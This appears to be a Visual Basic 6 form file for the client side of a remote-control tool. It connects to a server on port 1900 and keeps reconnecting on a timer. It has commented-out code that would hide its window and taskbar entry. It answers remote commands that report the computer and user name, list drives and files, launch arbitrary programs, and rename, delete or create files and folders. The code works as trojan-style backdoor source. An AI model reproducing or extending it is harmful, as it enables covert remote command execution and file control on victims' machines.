VERSION 5.00
Begin VB.Form FrmMijn 
   Caption         =   "Server"
   ClientHeight    =   750
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   10620
   Icon            =   "FrmMijn.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   750
   ScaleWidth      =   10620
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Interval        =   2000
      Left            =   600
      Top             =   120
   End
End
Attribute VB_Name = "FrmMijn"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Public WithEvents SckServer As CSocketMaster
Attribute SckServer.VB_VarHelpID = -1

Private Sub Form_Load()
Set SckServer = New CSocketMaster
SckServer.CloseSck
SckServer.Connect "127.0.0.1", 1900  ''127.0.0.1
''Me.Hide
''App.TaskVisible = False
End Sub

Private Sub sckserver_Connect(): SckServer.SendData "WachtW": End Sub

Private Sub Timer1_Timer()
If Not SckServer.State = sckConnected Then
SckServer.CloseSck
SckServer.Connect "127.0.0.1", 1900 ''127.0.0.1
End If
End Sub

Private Sub sckserver_DataArrival(ByVal bytesTotal As Long)
'On Error Resume Next
Dim SData As String
Dim AllData As String
Dim CMDS As String
Dim Multi() As String
Dim Temp_String

SckServer.GetData SData
Debug.Print SData

CMDS = Left(SData, 6)
AllData = Right(SData, Len(SData) - 6)
Multi() = Split(AllData, "\?/")

Select Case CMDS
Case "Srtlab"
Temp_String = "Srtlab"
Temp_String = Temp_String & "\?/" & SckServer.LocalIP & "\?/" & Environ("Computername") & " - " & Environ("Username")
SckServer.SendData Temp_String

Case "300100":  SckServer.SendData "300100" & EnumDrives
Case "STRFLS": Me.Caption = AllData
Drager = vbNullString
Call Zoeken(AllData)

Case "STRFL2"
Teller = Len(Drager)
If Zal + 1020 < Teller Then
SckServer.SendData "STRFLS" & "///" & Mid(Drager, Zal, 1020) '
Zal = Zal + 1020
Else: SckServer.SendData "STRFL2" & "///" & Right(Drager, Teller - Zal + 1)
End If

Case "SHLEXE" '': MsgBox AllData: Exit Sub
ShellExecuteA Me.hwnd, "Open", Multi(0), vbNullString, vbNullString, Multi(1)

Case "RNMFIL": Name Multi(0) & Multi(1) As Multi(0) & Multi(2)
Case "DELDEL": SCRDel (AllData)
Case "DIRMAP": On Error Resume Next
Me.Caption = AllData:  MkDir (AllData)
Case "DELMAP": On Error Resume Next
RmDir (AllData)

End Select
End Sub

